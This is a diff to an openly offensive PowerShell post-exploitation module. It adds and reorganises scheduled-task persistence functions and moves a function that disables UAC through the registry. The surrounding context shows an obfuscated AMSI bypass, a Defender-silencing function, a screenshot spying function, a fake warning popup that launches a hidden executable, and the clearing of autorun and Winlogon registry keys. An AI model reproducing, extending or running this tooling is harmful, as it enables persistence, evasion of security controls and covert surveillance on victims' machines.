@@ -142,6 +142,7 @@ $checkpsremote = "localhost"; $porty = 5985, 5986; foreach ($port in $porty) { T
 Export-ModuleMember -Function checkpsrem
 Set-Alias -Name checkpsrem -Value checkpsrem
 
+
 Function getservice {
 Get-WmiObject Win32_Service | Where-Object { $_.State -eq 'Running' } | Select-Object Name, ProcessId, StartMode, Status, DisplayName, ServiceType  | Format-Table -AutoSize
 }
@@ -180,7 +181,7 @@ Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "Au
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -ErrorAction Ignore
 Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore -Force
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -ErrorAction Ignore -Force
-Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*" -ErrorAction Ignore
+Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*" -ErrorAction Ignore 
 clear
 cd $env:userprofile
 }
@@ -217,7 +218,7 @@ Export-ModuleMember -Function privileges-unlock
 Set-Alias -Name privileges-unlock -Value privileges-unlock
 
 # need admin !!
-function persistence-tskschld {
+function persistence-tskschld-pswd {
     param(
 		[string]$Name,
 		[string]$Target,
@@ -233,8 +234,24 @@ $action = New-ScheduledTaskAction -Execute "$Request"
 $trigger = New-ScheduledTaskTrigger -AtStartup
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "$tname" -User "$user" -Password "$pass" -RunLevel Highest
 }
-Export-ModuleMember -Function persistence-tskschld
-Set-Alias -Name "persistence-tskschld" -Value persistence-tskschld
+Export-ModuleMember -Function persistence-tskschld-pswd
+Set-Alias -Name "persistence-tskschld-pswd" -Value persistence-tskschld-pswd
+
+#admin request!! 
+#persistence-tskschld -Name "MojeUloha" -Target "calc.exe"
+function persistence-tskschld {
+    param(
+        [string]$Name,
+        [string]$Target
+    )
+
+    $action  = New-ScheduledTaskAction -Execute $Target
+    $trigger = New-ScheduledTaskTrigger -AtLogOn
+    Register-ScheduledTask -TaskName $Name -Action $action -Trigger $trigger
+}
+Export-ModuleMember -Function persistence-tskschld 
+Set-Alias -Name "persistence-tskschld" -Value persistence-tskschld 
+
 
 function xtmpclean {
 Remove-Item -Path "$env:userprofile\d4m*" -force -ErrorAction SilentlyContinue
@@ -380,6 +397,7 @@ Remove-Item -Path $screenshotPath -Force -ErrorAction SilentlyContinue
 Export-ModuleMember -Function process-spyscreen 
 Set-Alias -Name process-spyscreen -Value process-spyscreen
 
+
 function uninstaller {
     [CmdletBinding()]
     param (
@@ -452,6 +470,7 @@ function uninstaller {
 Export-ModuleMember -Function uninstaller
 Set-Alias -Name uninstaller -Value uninstaller -Description "Run code for uninstaller"
 
+
 #popevilbox -Text "Check your system" -Header "@NT-SYSTEM: Warning!!" -What "powershell start-process .\testgo.exe -windowstyle hidden"
 function popevilbox {
     param(
@@ -481,14 +500,6 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('ble:1'+'q2')  + ('uZ'+'x') ) ( [TYpE]( "{1}{0}
 }
 Export-ModuleMember -Function bpsamsi
 Set-Alias -Name bpsamsi -Value bpsamsi
-
-# admin request !!
-function process-disableUAC {
-$alficum="ConsentPromptBehaviorAdmin"
-cmd /c reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v $alficum /t REG_DWORD /d 0 /f
-}
-Export-ModuleMember -Function process-disableUAC 
-Set-Alias -Name process-disableUAC  -Value process-disableUAC 
 
 #must be admin !!
 function silentdefender {
@@ -532,6 +543,11 @@ cd $env:??e????f???
 Export-ModuleMember -Function persistence-neighbor
 Set-Alias -Name persistence-neighbor -Value persistence-neighbor
 
-
-
+# admin request !!
+function process-disableUAC {
+$alficum="ConsentPromptBehaviorAdmin"
+cmd /c reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v $alficum /t REG_DWORD /d 0 /f
+}
+Export-ModuleMember -Function process-disableUAC 
+Set-Alias -Name process-disableUAC  -Value process-disableUAC 
 
